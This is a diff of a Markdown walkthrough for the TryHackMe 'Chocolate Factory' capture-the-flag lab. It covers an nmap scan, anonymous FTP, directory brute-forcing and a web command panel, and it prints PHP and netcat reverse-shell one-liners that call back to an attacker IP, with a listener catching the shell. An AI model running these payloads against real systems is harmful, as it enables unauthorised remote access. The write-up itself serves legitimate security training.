@@ -1,26 +1,28 @@
-![Screenshot from 2024-04-20 13-16-33](https://github.com/Esther7171/ChocolateFactory/assets/122229257/a0af3e10-b403-4dc4-84f3-3599590a0b2e)# ChocolateFactory Walkthrough [Tryhackme.com](https://tryhackme.com/r/room/chocolatefactory)
+# ChocolateFactory Walkthrough [Tryhackme.com](https://tryhackme.com/r/room/chocolatefactory)
 
-# Task 1. Introduction.
 
-# TASK 2. Challenges
 
-## Ques 1. Enter the key you found!
+## Task 1. Introduction.
+
+## TASK 2. Challenges
+
+### Ques 1. Enter the key you found!
 ```bash
 -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
 ```
 
-## Ques 2. What is Charlie's password?  
+### Ques 2. What is Charlie's password?  
 ```bash
 ```
 
-## Ques 3. change user to charlie
-### Ans. ---
+### Ques 3. change user to charlie
+#### Ans. ---
 
-## Ques 4. Enter the user flag
+### Ques 4. Enter the user flag
 ```bash
 ```
 
-## Ques 5. Enter the root flag
+### Ques 5. Enter the root flag
 ```bash
 ```
 
@@ -28,9 +30,9 @@
 ## 1. So Let make a Nmap scan
 ```bash
 ┌──(death㉿esther)-[~]
-└─$ nmap 10.10.85.131 -sV -Pn
+└─$ nmap 10.10.14.239 -sV -Pn
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 12:59 IST
-Nmap scan report for 10.10.85.131
+Nmap scan report for 10.10.14.239
 Host is up (0.26s latency).
 Not shown: 989 closed tcp ports (conn-refused)
 PORT    STATE SERVICE    VERSION
@@ -57,10 +59,10 @@ anonymous
 ```
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
-└─$ ftp 10.10.85.131
-Connected to 10.10.85.131.
+└─$ ftp 10.10.14.239
+Connected to 10.10.14.239.
 220 (vsFTPd 3.0.3)
-Name (10.10.85.131:death): anonymous
+Name (10.10.14.239:death): anonymous
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -73,10 +75,10 @@ ftp>
 ```bash
                                                                                 
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
-└─$ ftp 10.10.85.131
-Connected to 10.10.85.131.
+└─$ ftp 10.10.14.239
+Connected to 10.10.14.239.
 220 (vsFTPd 3.0.3)
-Name (10.10.85.131:death): anonymous
+Name (10.10.14.239:death): anonymous
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -198,7 +200,7 @@ Optimizers applied:
 ## 4. Let do directory search to get more info
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
-└─$ dirsearch -u 10.10.85.131 
+└─$ dirsearch -u 10.10.14.239 
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
 
@@ -207,9 +209,9 @@ Optimizers applied:
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /home/death/Lab-CTF/Choclaate_Factory/reports/_10.10.85.131/_24-04-20_19-34-48.txt
+Output File: /home/death/Lab-CTF/Choclaate_Factory/reports/_10.10.14.239/_24-04-20_19-34-48.txt
 
-Target: http://10.10.85.131/
+Target: http://10.10.14.239/
 
 [19:34:49] Starting: 
 [19:34:58] 403 -  277B  - /.ht_wsr.txt
@@ -246,7 +248,7 @@ Exception in thread Thread-14 (thread_proc):
 Traceback (most recent call last):
   File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc
     raise RequestException(err_msg)
-lib.core.exceptions.RequestException: Request timeout: http://10.10.85.131/sql/sqlweb/
+lib.core.exceptions.RequestException: Request timeout: http://10.10.14.239/sql/sqlweb/
 
 During handling of the above exception, another exception occurred:
 
@@ -255,22 +257,26 @@ During handling of the above exception, another exception occurred:
 ### Ok so i get two pages let check it out
 
 ### So it login page,
-![Screenshot from 2024-04-20 13-16-33](https://github.com/Esther7171/ChocolateFactory/assets/122229257/ecb5da30-e0e9-4286-829a-30579510bc81)
+![Screenshot from 2024-04-22 11-41-22](https://github.com/Esther7171/ChocolateFactory/assets/122229257/725db937-20c7-4046-9aac-3311a14be287)
+
 
 ### This one is command execution panel.
-![Screenshot from 2024-04-20 13-16-39](https://github.com/Esther7171/ChocolateFactory/assets/122229257/e845132a-a441-47c8-9a75-55dde5e47878)
+
+![Screenshot from 2024-04-22 11-40-45](https://github.com/Esther7171/ChocolateFactory/assets/122229257/1a68d2ad-7b6b-4204-9a87-83e1c71f933f)
 
 ### Let try to run some basic commands.
 
-#### By doing ls we got,
-![Screenshot from 2024-04-20 13-27-59](https://github.com/Esther7171/ChocolateFactory/assets/122229257/8948b638-6178-4ed2-bf4a-c9a6443dce5c)
+#### By doing ```ls``` we got,
+![Screenshot from 2024-04-22 11-42-13](https://github.com/Esther7171/ChocolateFactory/assets/122229257/e0260218-348e-4ea3-bc73-ebd3d62a918f)
 
 ### Here is key let to cat
-
 So it in Non readable formate
-![Screenshot from 2024-04-20 13-31-03](https://github.com/Esther7171/ChocolateFactory/assets/122229257/6c76f6b8-3205-4e88-86f5-d078853354e9)
+![Screenshot from 2024-04-22 11-43-20](https://github.com/Esther7171/ChocolateFactory/assets/122229257/b3f71a96-87c8-4492-a082-95cc3a82c53a)
+
 
 ### Let try to strings to read it 
+![Screenshot from 2024-04-22 11-43-30](https://github.com/Esther7171/ChocolateFactory/assets/122229257/2949e129-9133-48ad-a588-3c067bca3d9a)
+
 
 ```bash
 
@@ -286,7 +292,7 @@ So it in Non readable formate
 ### We got key , Let try to upload a reverse-shell here, so it in php formate let try php shell
 
 ## 5. Let uploads
-```here are all the rreverse-shell```
+```here are all the reverse-shell```
 ```bash
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ```
@@ -294,17 +300,31 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ```bash
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-let open netcat listner and change IP in reverse shell
+### let open netcat listner and change IP in reverse shell
 
+```bash
 ┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
 └─$ nc -nlvp 1234
+```
 listening on [any] 1234 ...
 
 ### I'm not getting any connection mean that wrong let try to upload a netcat reverse shell
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
-### Let try this one, change IP
+### Let try this one, change IP, Let upload it 
+![Screenshot from 2024-04-22 11-35-41](https://github.com/Esther7171/ChocolateFactory/assets/122229257/bd40e4d9-6a13-4f25-aada-ff7a9b1cce31)
+
+### Let setup listener !! Here wo got connection
+```bash
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.17.120.99] from (UNKNOWN) [10.10.14.239] 35024
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+### Let enumerate manually
+
 
 
 
